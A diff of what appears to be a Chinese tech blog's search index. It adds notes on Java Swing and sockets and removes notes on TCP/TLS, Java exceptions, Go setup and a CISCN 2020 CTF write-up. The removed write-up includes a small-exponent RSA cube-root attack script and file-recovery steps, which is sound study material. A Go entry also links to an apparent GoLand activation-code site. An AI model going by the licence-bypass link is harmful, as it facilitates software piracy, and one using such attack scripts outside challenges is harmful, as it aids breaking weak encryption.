+    <url>/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
+<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
+<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
+<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
+<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
+<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
+<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
 ]]></content>
       <categories>
-        <category>CTF</category>
+        <category>编程语言</category>
+        <category>Java</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>指令集和操作系统位数</title>
-    <url>/2020/06/10/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/</url>
-    <content><![CDATA[<h2 id="指令集"><a class="header-anchor" href="#指令集"></a>指令集</h2>
-<p>为了提高编写和运行程序的效率，将一些较为常用的指令（如积分，微分，乘除法等）写成一套标准的程序，即指令集。</p>
-<h3 id="X86和ARM"><a class="header-anchor" href="#X86和ARM"></a>X86和ARM</h3>
-<p>完整的，复杂的指令集称作<code>CISC</code> (Complex Instruction Set Computing)，在复杂指令集中许多运算是不常用的，让CPU支持所有指令是对晶体管的严重浪费，所以亨尼西和帕特森等人提出了一种更加简单的指令集，叫做精简指令集<code>RISC</code> (Reduced Instruction Set Computing)</p>
-<p><code>X86</code>是英特尔推出的一种CPU架构，采用复杂指令集CISC</p>
-<p><code>ARM</code>是acorn公司设计的CPU架构，采用精简指令集RISC</p>
-<h2 id="操作系统位数"><a class="header-anchor" href="#操作系统位数"></a>操作系统位数</h2>
-<p>首先明确<code>CPU位数</code>的概念，CPU位数即CPU在一个时钟周期内能够处理的二进制串的位数，也是CPU寄存器的位数。目前64位的CPU是主流。</p>
-<p>而<strong>操作系统位数</strong>即操作系统所依赖的指令集位数，可以理解为：32位的操作系统假定CPU是32位的，64位操作系统则假定CPU是64位的。所以，64位CPU的主机可以安装64位和32位甚至更低位数的操作系统，而32位CPU的主机只能安装32位及以下的操作系统（即向下兼容）。</p>
-]]></content>
-      <categories>
-        <category>专业课</category>
-        <category>操作系统</category>
-      </categories>
-      <tags>
-        <tag>操作系统</tag>
+        <tag>Java</tag>
+        <tag>GUI</tag>
       </tags>
   </entry>
   <entry>
@@ -1595,118 +1772,21 @@
       </tags>
   </entry>
   <entry>
-    <title>TCP&amp;IP</title>
-    <url>/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&amp;IP/</url>
-    <content><![CDATA[<h2 id="TCP"><a class="header-anchor" href="#TCP"></a>TCP</h2>
-<h3 id="三次握手和四次挥手"><a class="header-anchor" href="#三次握手和四次挥手"></a>三次握手和四次挥手</h3>
-<p>TCP是可靠的，面向连接的传输层协议，端到端之间要进行TCP通信首先就要建立起TCP连接，当通信结束时断开TCP连接。这里TCP连接的建立与断开过程就分别由<code>三次握手</code>和<code>四次挥手</code>来完成。</p>
-<ul>
-<li>
-<p>三次握手</p>
-<p>TCP连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。具体过程如下图所示。</p>
-<p><img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316191610581.png" alt="image-20210316191610581"></p>
-<p><strong>第一次握手：</strong> 建立连接。客户端发送连接请求报文段，SYN位置为1，Sequence Number为随机数<code>i</code>；然后，客户端进入SYN_SENT状态，等待服务器的确认；</p>
-<p><strong>第二次握手：</strong> 服务器收到SYN报文段。服务器收到客户端的SYN报文段，需要对这个SYN报文段进行确认，设置Acknowledgment Number为<code>i+1</code> ( Sequence Number+1 )；同时，自己自己还要发送SYN请求信息，SYN设置为1，Sequence Number为<code>j</code>；服务器端将上述所有信息放到一个报文段（即SYN+ACK报文段）中，一并发送给客户端，此时服务器进入SYN_RCVD状态；</p>
-<p><strong>第三次握手：</strong> 客户端收到服务器的SYN+ACK报文段。然后将Acknowledgment Number设置为<code>j+1</code>，向服务器发送ACK报文段，这个报文段发送完毕以后，客户端和服务器端都进入ESTABLISHED状态，完成TCP三次握手。</p>
-<p>在wireshark中可以分别查看<code>ACK</code>和<code>Seq</code>的实际值和相对值，第一个包的Seq相对值为0。</p>
-<p><strong><code>Seq</code>的相对值为当前端已发送的TCP总段长，<code>ACK</code>的相对值为当前端已接收的TCP总段长（单位：字节），</strong><code>SYN</code>标志位和<code>FIN</code>标志位也要占1字节（其他标志位如ACK不占）。</p>
-</li>
-<li>
-<p>四次挥手</p>
-<img src="/2021/03/14/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/TCP&IP/image-20210316213743223.png" style="zoom:50%;">
-<p><strong>中断连接端可以是Client端，也可以是Server端。</strong></p>
-<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说&quot;我Client端没有数据要发给你了&quot;，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，&quot;就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，“就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
-</li>
-</ul>
-<h3 id="TCP-UDP"><a class="header-anchor" href="#TCP-UDP"></a>TCP/UDP</h3>
-<p>有连接/无连接（可靠/不可靠）</p>
-<p>有拆分合并/无拆分合并</p>
-<p>有拥塞控制/无拥塞控制（发送速率的调整）</p>
-<p>单播/多播</p>
-<h3 id="滑动窗口和流量控制"><a class="header-anchor" href="#滑动窗口和流量控制"></a>滑动窗口和流量控制</h3>
-<h3 id="拥塞控制"><a class="header-anchor" href="#拥塞控制"></a>拥塞控制</h3>
-<h2 id="http-https"><a class="header-anchor" href="#http-https"></a>http/https</h2>
-<h3 id="http各版本区别"><a class="header-anchor" href="#http各版本区别"></a>http各版本区别</h3>
-<p>http1.0 vs http1.1</p>
-<p>http1.1开始，默认使用长连接（HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。）</p>
-<p>http1.1增加了一些错误状态码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。</p>
-<h3 id="SSL-TLS"><a class="header-anchor" href="#SSL-TLS"></a>SSL/TLS</h3>
-<ul>
-<li>首先由客户端发送Client Hello 消息到服务器，消息中主要包含了客户端支持的<code>ciphersuites</code>， TLS 版本信息和客户端随机数。<strong>注意此时是明文传输</strong></li>
-<li>服务器接收到消息后，返回自己支持的<code>ciphersuites</code>， TLS 版本，<strong>自己的数字证书</strong>和服务器端生成的随机数。<strong>注意此时是明文传输</strong></li>
-<li>客户端开始验证数字证书，可能会不断往上追溯 CA、CA 的 CA、CA 的 CA 的 CA，直到一个受信的 CA。验证完证书之后生成一个新的<code>pre-master key</code>，再使用证书中的公钥来对<code>pre-master key</code>进行加密，然后发送给服务器。<strong>注意此时是非对称加密传输</strong></li>
-<li>服务器接收到客户端发送过来的非对称加密的密文，使用自己的私钥进行解密，获得了<code>pre-master key</code>。<strong>注意此时是非对称加密传输</strong></li>
-<li>到这里为止，服务器和客户端都有三组数字，**分别是客户端的随机数、服务器的随机数和pre-master key。**其中由于客户端的随机数和服务器的随机数都是使用明文传输，所以这两个数字是有被暴露的风险的，但是由于<code>pre-master key</code>是使用非对称加密传输，十分安全，所以将这三者结合，使用之前协商好的特定的算法就可以生成一个密钥，这个密钥称为<code>shared secert</code>。也就是之后用来对称加密的密钥。</li>
-<li>客户端在计算出对称加密的密钥之后，使用该密钥进行对称加密通信，告知服务器之后都使用该密钥进行对称加密。<strong>注意此时是对称加密传输</strong></li>
-<li>服务器接收到密文后，使用之前计算出的密钥来进行对称解密，解密成功之后，再使用该密钥进行对称加密通信。告知客户端密钥确认无误，可以使用该密钥进行通信。<strong>注意此时是对称加密传输</strong></li>
-<li>至此，整个TLS的握手过程完整，之后就可以开始对称加密的通信了。</li>
-</ul>
-<h2 id="参考文章"><a class="header-anchor" href="#参考文章"></a>参考文章</h2>
-<ul>
-<li><a href="https://blog.csdn.net/whuslei/article/details/6667471">TCP协议中的三次握手和四次挥手(图解)</a></li>
-<li><a href="https://zhuanlan.zhihu.com/p/72587882">关于 TCP/IP，必知必会的10个问题</a></li>
-</ul>
+    <title>Java网络编程</title>
+    <url>/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="SOCKET"><a class="header-anchor" href="#SOCKET"></a>SOCKET</h2>
+<p><strong>定义：<code>socket</code>即套接字，由 ip 地址和端口号两个部分组成</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InetAddress类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getByName</span><span class="params">(String host)</span> <span class="comment">//根据域名获取ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getLocalHost</span><span class="params">()</span> <span class="comment">//获取本地ip</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostAddress</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的ip地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getHostName</span><span class="params">()</span> <span class="comment">//获得InetAddress对象的域名</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Socket类：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(InetAddress address, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Socket</span><span class="params">(String host, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Socket <span class="title">accept</span><span class="params">()</span> <span class="comment">//服务器端接收socket连接请求，创建socket对象</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输入流，用于接收网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> OutputStream <span class="title">getOutputStream</span><span class="params">()</span> <span class="comment">//返回此套接字的输出流，用于发送网络消息</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getInetAddress</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程IP地址或null</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> InetAddress <span class="title">getLocalAddress</span><span class="params">()</span> <span class="comment">//获取套接字绑定的本地地址</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPort</span><span class="params">()</span> <span class="comment">//返回此套接字连接到的远程端口号或0</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLocalPort</span><span class="params">()</span> <span class="comment">//返回此套接字绑定到的本地端口或 -1</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
+<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
 ]]></content>
       <categories>
-        <category>专业课</category>
-        <category>计网</category>
+        <category>编程语言</category>
+        <category>Java</category>
       </categories>
       <tags>
-        <tag>计算机网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>国赛2020WP</title>
-    <url>/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/</url>
-    <content><![CDATA[<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
-<h3 id="签到"><a class="header-anchor" href="#签到"></a>签到</h3>
-<p>助力即可得到flag</p>
-<h3 id="the-best-ctf-game"><a class="header-anchor" href="#the-best-ctf-game"></a>the_best_ctf_game</h3>
-<p>解压得到二进制文件:flag</p>
-<p>使用winhex打开</p>
-<p>观察到</p>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820142658465.png" alt="image-20200820142658465"></p>
-<p>即flag的值</p>
-<h3 id="电脑被黑"><a class="header-anchor" href="#电脑被黑"></a>电脑被黑</h3>
-<p>解压缩包得到disk_dump文件</p>
-<p>使用file 命令查看信息</p>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201008231.png" alt="image-20200820201008231"></p>
-<p>可以看到是ext3的文件系统</p>
-<p>挂载到 test文件夹下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount .&#x2F;disk_dump .&#x2F;test&#x2F;</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201521587.png" alt="image-20200820201521587"></p>
-<p>查看???.png，提示flag已被删除</p>
-<p>使用extundelete恢复被删除的文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete .&#x2F;disk_dump --restore-all</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201902816.png" alt="image-20200820201902816"></p>
-<p>得到flag.txt，但打开后是乱码</p>
-<p>返回test/misc01文件夹下，看到可执行文件demo</p>
-<p>使用strings命令查看</p>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820202222131.png" alt="image-20200820202222131"></p>
-<p>猜测demo对flag.txt进行了处理</p>
-<p>使用ida反编译查看其伪源码</p>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/20200820202837.png" alt="image-20200820202837"></p>
-<p>编写代码对flag文件进行解码</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fileOld = fopen(<span class="string">"D:\\flag.txt"</span>,<span class="string">"rb"</span>);</span><br><span class="line">    FILE *fileNew = fopen(<span class="string">"D:\\flagNew.txt"</span>,<span class="string">"rb+"</span>);</span><br><span class="line">    <span class="keyword">char</span> v1,v4,v5;</span><br><span class="line">    v4 = <span class="number">34</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = fgetc(fileOld);</span><br><span class="line">        <span class="keyword">if</span>( v1 == <span class="number">-1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        fputc(((v1^v4)-v5),fileNew);</span><br><span class="line">        v4 += <span class="number">34</span>;</span><br><span class="line">        v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fileNew);</span><br><span class="line">    fclose(fileOld);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>解码后得到flag</p>
-<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
-<p>只做出来一道题</p>
-<h3 id="baby"><a class="header-anchor" href="#baby"></a>baby</h3>
-<p>一道RSA的密码学题目</p>
-<p>给了我们密文c和因数n，e很小。所以可以通过爆破的方式跑出明文</p>
-<p>解密脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import gmpy</span><br><span class="line">n &#x3D; 691316677109436623113422493782665795857921917893759942123087462879884062720557906429183155859597756890896192044003240821906332575292476160072039505771794531255542244123516929671277306361467074545720823735806308003091983427678300287709469582282466572230066580195227278214776280213722215953097747453437289734469454712426107967188109548966907237877840316009828476200388327329144783877033491238709954473809991152727333616022406517443130542713167206421787038596312975153165848625721911080561242646092299016802662913017071685740548699163836007474224715426587609549372289181977830092677128368806113131459831182390520942892670696447128631485606579943885812260640805756035377584155135770155915782120025116486061540105139339655722904721294629149025033066823599823964444620779259106176913478839370100891213072100063101232635183636552360952762838656307300621195248059253614745118852163569388418086291748805100175008658387803878200034840215506516715640621165661642177371863874586069524022258642915100615596032443145034847031564356671559179212705466145609698475546210994748949121359853094247990533075004393534565421776468785821261291309463205314057882016266066365636018084499158806717036972590848458891019171583268920180691221168453612029698510271</span><br><span class="line">c &#x3D; 3442467842482561323703237574537907554035337622762971103210557480050349359873041624336261782731509068910003360547049942482415036862904844600484976674423604861710166033558576921438068555951948966099658902606725292551952345193132973996288566246138708754810511646811362017769063041425115712305629748341207792305694590742066971202523405301561233341991037374101265623265332070787449332991792097090044761973705909217137119649091313457206589803479797894924402017273543719924849592070328396276760381501612934039653</span><br><span class="line">i &#x3D; 0</span><br><span class="line">while 1:</span><br><span class="line">    if(gmpy.root(c+i*n, 3)[1]&#x3D;&#x3D;1):</span><br><span class="line">        print gmpy.root(c+i*n, 3)</span><br><span class="line">        break</span><br><span class="line">    i &#x3D; i+1</span><br></pre></td></tr></table></figure>
-<p>结果是</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m&#x3D;1509929362729692740720713536968392715648402189242304424408501797538190273763219595501810359943405524344790331677540693316488309231687357778980543085568230705511696327037</span><br></pre></td></tr></table></figure>
-<p>再解码得到flag</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import libnum</span><br><span class="line">n&#x3D;1509929362729692740720713536968392715648402189242304424408501797538190273763219595501810359943405524344790331677540693316488309231687357778980543085568230705511696327037</span><br><span class="line">print(libnum.n2s(n))</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200920135022901.png" alt="image-20200920135022901"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
+        <tag>Java</tag>
       </tags>
   </entry>
   <entry>
@@ -1730,137 +1810,6 @@
 <h3 id="实现"><a class="header-anchor" href="#实现"></a>实现</h3>
 <p>关键字：<code>implements</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class A implements 接口名称 [,接口名称,...]&#123;</span><br><span class="line">		&#x2F;&#x2F;实现接口中的方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java-GUI编程</title>
-    <url>/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
-<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
-<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
-<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
-<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
-<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
-<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-        <tag>GUI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java 异常及处理</title>
-    <url>/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/</url>
-    <content><![CDATA[<h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
-<p><img src="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" alt="image-20200516112004702"></p>
-<h2 id="异常的处理"><a class="header-anchor" href="#异常的处理"></a>异常的处理</h2>
-<h3 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h3>
-<p>不处理异常，将异常抛出给调用者。</p>
-<p><code>throw</code>  、<code>throws</code></p>
-<p>（挖坑待填）</p>
-<h3 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h3>
-<p>当程序发生异常时，系统捕获异常，转而执行异常处理代码。</p>
-<ol>
-<li>可能出现异常的代码用<code>try</code>块括起来</li>
-<li>用<code>catch</code>块来捕获异常并处理异常</li>
-<li>一些不论是否出现异常都需要执行的代码，用<code>finally</code>块括起来，使其一定会被执行</li>
-</ol>
-<p><strong>代码执行过程的三种情况</strong></p>
-<ol>
-<li>
-<p>try代码块中无异常，try代码执行完成，则不进入不执行catch(跳过)，执行finally块，及异常块后的其他代码other code；</p>
-</li>
-<li>
-<p>try代码块中发生异常，try代码执行到有异常处即之后中断，产生异常对象(跟踪堆栈,执行流程)，进入catch块(异常类型匹配后处理)，后执行finally块，及异常块后的其他代码other code；</p>
-</li>
-<li>
-<p>try代码块中发生异常，产生异常对象，异常类型不匹配，或者不捕获，程序中断运行(不用try和catch块进行处理，代码在异常出停止)；</p>
-</li>
-</ol>
-<blockquote>
-<p>finally块语句唯一不执行的情况：异常处理代码catch中执行System.exit(1)退出Java虚拟机 ；</p>
-<p>一段代码可能会发生多种类型的异常，当发生异常，会按顺序查看每个catch语句，并执行第一个与异常类型匹配的catch块，执行后，其他的catch语句将忽略，执行继续执行finally块，及异常块后的其他代码other code。</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>golang的安装配置</title>
-    <url>/2021/07/14/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Go%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<h2 id="下载安装"><a class="header-anchor" href="#下载安装"></a>下载安装</h2>
-<p>下载地址：<a href="https://golang.google.cn/">https://golang.google.cn/</a></p>
-<p>安装后会自动添加环境变量</p>
-<p>运行安装程序完成后查看go版本，验证是否已正确安装</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go version    #查看版本</span><br></pre></td></tr></table></figure>
-<h2 id="配置"><a class="header-anchor" href="#配置"></a>配置</h2>
-<h3 id="env配置"><a class="header-anchor" href="#env配置"></a>env配置</h3>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go env    #查看go环境变量</span><br><span class="line">go env -w [环境变量名]=[变量值]    #写入环境变量（go version &gt; 1.13）</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/14/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Go%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20210709091726706.png" alt="image-20210709091726706"></p>
-<p>主要需要配置GOPATH（项目工作目录）、GOPROXY（go获取依赖包的代理服务器，proxy可以设置多个，⽤逗号<code>,</code>分隔，其中<code>direct</code>为直连）、GOPRIVATE（go get通过代理服务拉取私有仓库时，匹配那些不⾛代理的私有仓库）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GOPROXY&#x3D;&quot;https:&#x2F;&#x2F;goproxy.cn,https:&#x2F;&#x2F;goproxy.io,direct&quot;</span><br><span class="line">GOPRIVATE&#x3D;&quot;*.gitlab.com,*.gitee.com&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="IDE配置"><a class="header-anchor" href="#IDE配置"></a>IDE配置</h3>
-<h4 id="goland"><a class="header-anchor" href="#goland"></a>goland</h4>
-<p>goland:<a href="https://www.jetbrains.com/go/">https://www.jetbrains.com/go/</a></p>
-<p>Activation code:<a href="http://vrg123.com/">http://vrg123.com/</a></p>
-<h4 id="VSCode"><a class="header-anchor" href="#VSCode"></a>VSCode</h4>
-<p>配置步骤：<a href="https://m.imooc.com/wiki/golesson-vscodeinstall?ishidefooter=true">https://m.imooc.com/wiki/golesson-vscodeinstall?ishidefooter=true</a></p>
-<p>更多配置：<a href="http://c.biancheng.net/view/6170.html">http://c.biancheng.net/view/6170.html</a></p>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>go</category>
-      </categories>
-      <tags>
-        <tag>环境配置</tag>
-        <tag>go</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>golang项目结构</title>
-    <url>/2021/07/17/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Go%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84/</url>
-    <content><![CDATA[<p>GOPATH下的src目录就是接下来开发程序的主要目录，所有的源码都是放在这个目录下面，那么一般我们的做法就是一个目录一个项目，例如: $GOPATH/src/mymath 表示mymath这个应用包或者可执行应用，这个根据package是main还是其他来决定，main的话就是可执行应用，其他的话就是应用包</p>
-<p>所以当新建应用或者一个代码包时都是在src目录下新建一个文件夹，文件夹名称一般是代码包名称，当然也允许多级目录，例如在src下面新建了目录$GOPATH/src/github.com/astaxie/beedb 那么这个包路径就是&quot;<a href="http://github.com/astaxie/beedb">github.com/astaxie/beedb</a>&quot;，包名称是最后一个目录beedb</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bin&#x2F;</span><br><span class="line">    mathapp</span><br><span class="line">pkg&#x2F;</span><br><span class="line">    平台名&#x2F; 如：darwin_amd64、linux_amd64</span><br><span class="line">         mymath.a</span><br><span class="line">         github.com&#x2F;</span><br><span class="line">              astaxie&#x2F;</span><br><span class="line">                   beedb.a</span><br><span class="line">src&#x2F;</span><br><span class="line">    mathapp</span><br><span class="line">          main.go</span><br><span class="line">      mymath&#x2F;</span><br><span class="line">          sqrt.go</span><br><span class="line">      github.com&#x2F;</span><br><span class="line">           astaxie&#x2F;</span><br><span class="line">                beedb&#x2F;</span><br><span class="line">                    beedb.go</span><br><span class="line">                    util.go</span><br></pre></td></tr></table></figure>
-<p>Go程序是通过<code>package</code>来组织的</p>
